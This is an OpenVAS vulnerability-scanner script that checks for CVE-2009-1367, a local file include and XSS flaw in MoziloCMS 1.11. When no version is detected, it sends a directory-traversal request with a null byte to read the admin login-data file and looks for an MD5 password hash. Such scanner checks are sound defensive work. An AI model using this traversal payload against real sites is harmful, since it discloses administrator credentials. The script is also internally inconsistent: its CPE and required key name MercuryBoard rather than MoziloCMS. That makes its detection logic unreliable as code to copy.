###############################################################################
# OpenVAS Vulnerability Test
# $Id: mozilloCMS_34474.nasl 12861 2018-12-21 09:53:04Z ckuersteiner $
#
# MoziloCMS Local File Include and Cross Site Scripting
# Vulnerabilities
#
# Authors
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:mercuryboard:mercuryboard";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100124");
  script_version("$Revision: 12861 $");
  script_tag(name:"last_modification", value:"$Date: 2018-12-21 10:53:04 +0100 (Fri, 21 Dec 2018) $");
  script_tag(name:"creation_date", value:"2009-04-12 20:09:50 +0200 (Sun, 12 Apr 2009)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2009-1367");
  script_bugtraq_id(34474);

  script_name("MoziloCMS Local File Include and Cross Site Scripting Vulnerabilities");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("mozilloCMS_detect.nasl");
  script_mandatory_keys("MercuryBoard/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"MoziloCMS is prone to a local file-include vulnerability and a
  cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.

  An attacker can exploit the local file-include vulnerability using
  directory-traversal strings to view and execute local files within
  the context of the webserver process.

  The attacker may leverage the cross-site scripting issue to execute
  arbitrary script code in the browser of an unsuspecting user in the
  context of the affected site. This may let the attacker steal
  cookie-based authentication credentials and launch other attacks.

  MoziloCMS 1.11 is vulnerable, other versions may also be affected.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34474");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

version = get_app_version(cpe: CPE);

if (version) {
  if (version_is_equal(version: version, test_version: "1.11")) {
    report = report_fixed_ver(installed_version: version, fixed_version: "None");
    security_message(port: port, data: report);
    exit(0);
  }
}

# No version found, try to exploit.
if (!dir = get_app_location(port: port, cpe: CPE))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php?cat=10_Willkommen&page=../../admin/conf/logindata.conf%00";
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(egrep(pattern:"pw = [a-f0-9]{32}", string: buf)) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
